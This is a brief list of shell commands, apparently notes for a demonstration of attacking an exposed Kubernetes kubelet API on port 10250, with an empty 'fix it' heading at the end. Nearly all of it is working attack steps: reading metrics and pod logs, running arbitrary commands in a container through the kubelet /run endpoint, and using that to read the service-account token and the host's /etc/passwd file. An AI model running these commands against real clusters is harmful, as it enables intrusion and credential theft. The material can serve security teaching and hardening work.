
# get infos

curl -k https://$IP:10250/metrics
curl -k https://$IP:10250/logs/pods/

# run code

kubectl apply -f pod.yaml

# get sensitive data

curl -XPOST -k https://$IP:10250/run/<namespace>/<pod>/<container> -d "cmd=<command-to-run>"

curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"

# fix it